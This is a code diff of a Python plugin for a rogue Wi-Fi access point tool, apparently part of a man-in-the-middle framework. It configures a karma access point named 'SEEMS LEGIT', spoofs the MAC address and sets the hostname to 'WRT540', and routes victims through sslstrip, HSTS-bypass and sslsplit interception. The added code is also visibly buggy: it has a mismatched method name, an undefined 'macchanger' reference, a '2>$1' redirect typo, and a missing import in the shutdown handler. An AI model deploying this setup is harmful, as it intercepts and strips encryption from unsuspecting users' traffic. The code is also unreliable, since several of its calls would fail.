@@ -21,6 +21,10 @@ from plugins.plugin import Plugin
 import os
 import time
 
+DEFAULT_ESSID   = 'SEEMS LEGIT'
+DEFAULT_BSSID   = '00:11:22:33:44:00'
+DEFAULT_CHANNEL = 1
+
 class ManaToolkit(Plugin):
 
     name      = 'ManaToolkit'
@@ -31,82 +35,46 @@ class ManaToolkit(Plugin):
 
     def initialize(self, options):
 
+        from core.utils import iptables
+        from core.hostapd_mana import HostAPDMana, DHCPDMana
 
         self.options = options
 
-        self.phy = options.phy
+        self.interface = options.interface
         self.upstream = options.upstream
         self.essid = options.essid
         self.bssid = options.bssid
         self.channel = options.channel
-        
-
-        if options.nat_simple:
-            self._initialize_nat_simple()
-
-        elif options.nat_full:
-            self._initialize_nat_full()
-
-        elif options.noupstream_all:
-            self._initialize_noupstream()
-
-        elif options.noupstream_eap:
-            self._initialize_noupstream_eap()
-
-        elif options.noupstream_eaponly:
-            self._initialize_noupstream_eaponly()
-
-        elif options.noupstream:
-            self._initialize_noupstream()
-
-    def _initialize_nat_simple(self):
-
-        from core.utils import iptables, NetworkManager, set_ip_forwarding
-        from core.hostapd_mana import HostAPDMana, DHCPDMana
 
         hostapd = HostAPDMana.get_instance()
-        network_manager = NetworkManager.get_instance()
         dhcpd = DHCPDMana.get_instance()
 
-        os.system('killall dnsmasq')
-    
-        network_manager.stop()
-        os.system('rfkill unblock wlan')
-
-        os.system('ifconfig %s up' % self.phy)
-
-        hostapd.configure_karma(phy=self.phy,
+        hostapd.configure_karma(interface=self.interface,
                             essid=self.essid,
                             bssid=self.bssid,
                             channel=self.channel)
-        #hostapd.start()
-        time.sleep(5)
-        os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' % self.phy)
-        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
 
         dhcpd.select_conf('dhcpd.conf')
-        #dhcpd.start(self.phy)
-        
-        set_ip_forwarding(1)
-        
-        print 'setting up iptables'
-        iptables().ROGUE_AP_NAT(upstream=self.upstream, phy=self.phy)
 
-        if not iptables().http and self.options.filter is None:
-            iptables().HTTP(self.options.listen_port)
+        self._kill_daemons()
+
+        self._prepwifi(spoof_mac=options.nat_full, set_hostname=options.nat_full)
+        
+        if options.nat_simple:
+            iptables().ROGUE_AP(hsts=True, sslstrip=True)
+        elif options.nat_full:
+            iptables().ROGUE_AP(hsts=True, sslstrip=True, sslsplit=True)
 
     def on_shutdown(self):
 
         from core.utils import iptables
         from core.hostapd_mana import HostAPDMana, DHCPDMana
 
-        hostapd = HostAPDMana.get_instance()
-        _iptables = iptables()
-        dhcpd = DHCPDMana.get_instance()
+        iptables().flush()
+        HostAPDMana.get_instance().stop()
+        DHCPDMana.get_instance().stop()
 
-        _iptables.flush()
-        hostapd.stop()
-        dhcpd.stop()
+        set_ip_forwarding(0)
 
     def options(self, options):
 
@@ -142,35 +110,57 @@ class ManaToolkit(Plugin):
             action='store_true',
             help='Use no upstream.')
 
-        options.add_argument('--upstream-iface', 
+        options.add_argument('--upstream', 
             dest='upstream',
             type=str,
             required=False,
             help='Gateway iface.')
 
-        options.add_argument('--phy-iface', 
-            dest='phy',
-            type=str,
-            required=True,
-            help='AP iface.')
-
         options.add_argument('--channel', 
             dest='channel',
             type=int,
-            required=True,
+            default=DEFAULT_CHANNEL,
+            required=False,
             help='AP channel.')
 
         options.add_argument('--bssid', 
             dest='bssid',
-            default='00:11:22:33:44:00',
+            default=DEFAULT_BSSID,
             type=str,
             required=False,
             help='AP bssid.')
 
         options.add_argument('--essid', 
             dest='essid',
-            default='SEEMS LEGIT',
+            default=DEFAULT_ESSID,
             type=str,
             required=False,
             help='AP name.')
 
+    def _killdaemons(self):
+        os.system('killall dnsmasq 2>$1')
+
+    def _prepwifi(self, spoof_mac=False, set_hostname=False):
+
+        from core.utils import NetworkManager, set_ip_forwarding
+
+        if set_hostname:
+            os.system('hostname WRT540')
+            time.sleep(2)
+
+        network_manager = NetworkManager.get_instance()
+        network_manager.stop()
+        os.system('rfkill unblock wlan')
+
+        if spoof_mac:
+            from core.hostapd_mana import MacChanger
+            macchanger = macchanger.get_instance()
+            macchanger.random(self.interface)
+        else:
+            os.system('ifconfig %s up' % self.interface)
+
+        time.sleep(5)
+        os.system('ifconfig %s 10.0.0.1 netmask 255.255.255.0' % self.interface)
+        os.system('route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1')
+
+        set_ip_forwarding(1)
